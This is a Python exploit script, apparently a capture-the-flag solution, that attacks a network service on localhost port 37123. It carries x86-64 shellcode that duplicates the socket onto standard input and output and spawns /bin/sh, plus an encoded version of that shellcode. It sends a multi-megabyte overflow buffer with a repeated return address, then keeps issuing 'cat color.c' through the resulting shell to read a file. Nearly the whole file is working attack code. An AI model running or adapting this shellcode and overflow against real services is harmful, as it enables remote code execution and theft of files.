import socket
import struct
import time


old_shellcode = b''.join([
    b'\x90\x90\xcc',
    b'\x48\x31\xc0',
    b'\x48\x31\xd2',
    b'\x48\x31\xf6',
    b'\x90\xb0\x21',
    b'\x90\x90\x66\xbf\x04\x00',
    b'\x90\x90\x66\xbe\x00\x00',
    b'\x90\x0f\x05',
    b'\x48\x31\xc0',
    b'\x90\xb0\x21',
    b'\x90\x90\x66\xbe\x01\x00',
    b'\x90\x0f\x05',
    b'\x48\x31\xc0',
    b'\x90\xb0\x21',
    b'\x90\x90\x66\xbe\x02\x00',
    b'\x90\x0f\x05',
    b'\x66\x6a\x68',
    b'\x90\x90\x66\x68\x2f\x73',
    b'\x90\x90\x66\x68\x69\x6e',
    b'\x90\x90\x66\x68\x2f\x62',
    b'\x48\x89\xe7',
    b'\x48\x31\xc0',
    b'\x90\xb0\x3b',
    b'\x48\x31\xf6',
    b'\x48\x31\xd2',
    b'\x90\x0f\x05',
])

new_shellcode = b''.join([
    b'\xaa\x4b\xcc',
    b'\xb0\xbd\xc0',
    b'\xaf\xc3\xd2',
    b'\xae\xcc\xf6',
    b'\x33\xcf\xb0',
    b'\x2a\x4a\x90\x00\xff\xbf',
    b'\x2a\x4a\x90\x00\xff\xbe',
    b'\x02\xf6\x90',
    b'\xb0\xbd\xc0',
    b'\x33\xcf\xb0',
    b'\x2a\x4a\x90\x00\xff\xbe',
    b'\x02\xf6\x90',
    b'\xb0\xbd\xc0',
    b'\x33\xcf\xb0',
    b'\x2a\x4a\x90\x00\xff\xbe',
    b'\x02\xf6\x90',
    b'\x69\x09\x6a',
    b'\x2a\x4a\x90\xcd\x96\x73',
    b'\x2a\x4a\x90\xa2\x0d\x6e',
    b'\x2a\x4a\x90\xd8\x8b\x68',
    b'\x98\xaf\xe7',
    b'\xb0\xbd\xc0',
    b'\x35\xa9\xb0',
    b'\xae\xcc\xf6',
    b'\xaf\xc3\xd2',
    b'\x02\xf6\x90',
])


def main():
    buf = new_shellcode + b'A' * (3000000 - len(new_shellcode)) \
          + b'A' * 4 + struct.pack('<Q', 0x602100) * 40
    if len(buf) % 3 == 1:
        buf = buf + b'A' * 2
    elif len(buf) % 3 == 2:
        buf = buf + b'A' * 1
    assert len(buf) % 3 == 0
    s = socket.socket()
    s.connect(('localhost', 37123))
    s.sendall(struct.pack('>I', len(buf) // 3))
    s.sendall(buf)

    recv_count = 0

    while recv_count < len(buf):
        print('here')
        recv_count += len(s.recv(len(buf) - recv_count))

    print('Done receiving')

    while True:
        time.sleep(1)
        s.sendall(b'cat color.c\n')
        time.sleep(1)
        print(s.recv(4096))


if __name__ == '__main__':
    main()
